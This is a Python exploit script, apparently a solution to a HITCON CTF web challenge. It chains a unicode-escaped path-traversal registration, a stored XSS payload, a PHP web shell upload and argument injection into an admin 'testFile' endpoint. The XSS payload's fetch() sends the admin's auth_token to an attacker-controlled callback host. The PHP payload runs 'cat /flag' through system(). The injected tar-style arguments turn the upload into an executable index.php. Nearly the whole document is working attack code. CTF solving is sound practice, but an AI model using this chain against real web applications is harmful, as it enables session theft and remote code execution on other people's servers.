import io
import random
import sys

import requests

target = sys.argv[1]  # "http://note.chal.hitconctf.com:30001"
rnd = random.randint(10000000, 99999999999)
cbhost = sys.argv[2]

jsonpayload = (
    '{"username": "\\u002e\\u002e\\\\\\u0061dmin\\\\'
    + str(rnd)
    + '\\\\\\u002e\\u002e","password": "123456"}'
)

r = requests.post(
    f"{target}/api/register",
    data=jsonpayload,
    headers={"Content-Type": "application/json"},
)


print(r.content)
token1 = r.json()["token"]
xsspayload = f"<html><body><script>fetch('http://{cbhost}/'+localStorage['auth_token'])</script></body></html>"
ff = io.StringIO(xsspayload)
r = requests.post(
    f"{target}/api/upload",
    headers={"Authorization": f"bearer {token1}"},
    files={"file": ff},
)
h = r.json()["path"][-45:-5]
report_url = f"http://aaa:bbb@app/api/announcement/{h}.html"
print(f"XSS payload: {report_url}, report to admin")


r = requests.post(
    f"{target}/api/admin/report",
    headers={"Authorization": f"bearer {token1}"},
    data={"url": report_url},
)
# TODO: report to admin
# wait for XSS
# Should use admin's token
print(r.content)
token_admin = input("Admin Token: ").strip()
# token_admin = token1


phppayload = "<?php system('cat /flag');"
ff = io.StringIO(phppayload)
r = requests.post(
    f"{target}/api/upload",
    headers={"Authorization": f"bearer {token1}"},
    files={"file": ff},
)
h = r.json()["path"][-40:]
print(f"PHP Payload: {h}")


cmdipayload = f"{h} -f --backup=simple -S index[,-0]php -t build"
cmdiuser = f"\\u002e\\u002e\\\\\\u0061dmin\\\\{cmdipayload}"
cmdijson = f'{{ "username": "{cmdiuser}","password": "123456"}}'
print(cmdijson)
r = requests.post(
    f"{target}/api/register",
    data=cmdijson,
    headers={"Content-Type": "application/json"},
)
# print(r.content)
print("Regist user for pass cmdi exist check: " + r.json()["user"]["username"])
token2 = r.json()["token"]
# upload to create folder
ff = io.StringIO("")
r = requests.post(
    f"{target}/api/upload",
    headers={"Authorization": f"bearer {token2}"},
    files={"file": ff},
)
print(r.json())

r = requests.post(
    f"{target}/api/admin/testFile",
    params={"file": cmdipayload},
    headers={"Authorization": f"bearer {token_admin}"},
)
print(r.json())

if "output" not in r.json():
    print("Not an admin token")
    exit(1)

r = requests.post(
    f"{target}/api/admin/testFile",
    params={"file": cmdipayload},
    headers={"Authorization": f"bearer {token_admin}"},
)
print(r.json())


r = requests.get(f"{target}/build/{h}index.php")


if r.status_code != 404:
    print(r.content)
else:
    print(f"/{target}/build/{h}index.php Not Found ")
    exit(-1)
